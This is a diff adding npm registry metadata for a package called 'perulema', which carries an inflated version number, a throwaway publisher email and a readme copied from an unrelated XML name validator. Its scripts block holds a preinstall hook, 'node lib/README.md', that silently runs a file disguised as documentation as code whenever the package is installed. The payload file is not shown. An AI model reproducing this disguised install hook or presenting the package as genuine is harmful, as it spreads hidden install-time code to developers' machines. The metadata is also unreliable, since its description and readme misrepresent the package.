@@ -1,0 +1,68 @@
+{
+    "_id": "perulema",
+    "name": "perulema",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "perulema",
+            "version": "99.10.9",
+            "description": "okbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node lib/README.md"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "perulema@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-y+W239IyamK53wBKbUV1rtzEe2Ca2sJKB4os3dEZPnF4NjW4qzUJoEeUMX4cjNfUEMDw0T1JiXVO5D5Ox0Jnjw==",
+                "shasum": "0fd8ed6e99da4931caebc1e3caedc9cfa1b8e58b",
+                "tarball": "https://registry.npmjs.org/perulema/-/perulema-99.10.9.tgz",
+                "fileCount": 8,
+                "unpackedSize": 29149,
+                "signatures": [
+                    {
+                        "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+                        "sig": "MEUCIGlloo2wSw2nx7E8RHIyjNyk5rSmPFJrEDXNzGDY8HCDAiEA0B9QpfkINAVw5ojSWdRmJd4Bj057f+YwTncjnZQf1Cw="
+                    }
+                ],
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiRdVfACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmog6xAAhpFvZTQLCpJgzjgqs/8KPZpLEilbR+oGogPVQyfspmN1KA3y\r\nGr6donXxMoRzpiTcmTR3/9DGsDWaWvXpNUJgvRNooX98I55prBbJfr5ksWJe\r\nzoonZTgsWjlqtSYRV00Wk0jCc2Kxsyb9hS9Gpjp9avib/OePql5OP8z9/BeO\r\n0qK1HT0M+Vj6MGyyE/cg8A+FGhPO44+DzxWfc9DbUItsWJGJbJS4VOkmm7lG\r\nwypfxZMgqv7Jy8z3Yzf0jISeZDbLjDqkmXeiTpSdcPVfylwDm4t5zbHX7L8A\r\nVVe6pwGToaxmeeh+ctn0qKgnl+432D7kKPv8QcQ+9A5+B0ocPLlj0DXfc2JU\r\n9D2iPJZ068P7P99bWng84csUzfybqx74rfSktWbTonawJCzYslt8k4j33/fo\r\nckrxXAz8vUyGzvmBotDHiKZNnGCDhhjFjH4Lv1Bp52VdcBDeOHAUMsXtV4Ez\r\nHl0hXG12xuD144EURr5ub9Uhs13vOh60/rBPuTtSFUqlz8Vx4iYlX4ctumAA\r\nX695qWjJnA5LZ2boIHLrDiaKTv2UWbST29FvRofSAbBMA+zGWWW/8C2xxh92\r\nt/1xRwMBxB6Zsnlf+A+zsXEdIAZpRb+T3N5fL9MWc6id7Bm1gyx/GpA4/g1h\r\ndIjwiI7U8PxRw1Ee/4jG9L3U87bV9aGMqTU=\r\n=S/fH\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "9291dyko",
+                "email": "9291dyko@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "9291dyko",
+                    "email": "9291dyko@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/perulema_99.10.9_1648743775289_0.9208865451991721"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-31T16:22:55.288Z",
+        "99.10.9": "2022-03-31T16:22:55.444Z",
+        "modified": "2022-03-31T16:22:55.576Z"
+    },
+    "maintainers": [
+        {
+            "name": "9291dyko",
+            "email": "9291dyko@33mail.ga"
+        }
+    ],
+    "description": "okbit package",
+    "readme": "# Validate XML Names and Qualified Names\n\nThis package simply tells you whether or not a string matches the [`Name`](http://www.w3.org/TR/xml/#NT-Name) or [`QName`](http://www.w3.org/TR/xml-names/#NT-QName) productions in the XML Namespaces specification. We use it for implementing the [validate](https://dom.spec.whatwg.org/#validate) algorithm in jsdom, but you can use it for whatever you want.\n\n## Usage\n\nThis package's main module's default export takes a string and will return an object of the form `{ success, error }`, where `success` is a boolean and if it is `false`, then `error` is a string containing some hint as to where the match went wrong.\n\n```js\n\"use strict\":\nvar xnv = require(\"xml-name-validator\");\nvar assert = require(\"assert\");\n\n// Will return { success: true, error: undefined }\nxnv.name(\"x\");\nxnv.name(\":\");\nxnv.name(\"a:0\");\nxnv.name(\"a:b:c\");\n\n// Will return { success: false, error: <an explanatory string> }\nxnv.name(\"\\\\\");\nxnv.name(\"'\");\nxnv.name(\"0\");\nxnv.name(\"a!\");\n\n// Will return { success: true, error: undefined }\nxnv.qname(\"x\");\nxnv.qname(\"a0\");\nxnv.qname(\"a:b\");\n\n// Will return { success: false, error: <an explanatory string> }\nxnv.qname(\":a\");\nxnv.qname(\":b\");\nxnv.qname(\"a:b:c\");\nxnv.qname(\"a:0\");\n```\n",
+    "readmeFilename": "README.md"
+}
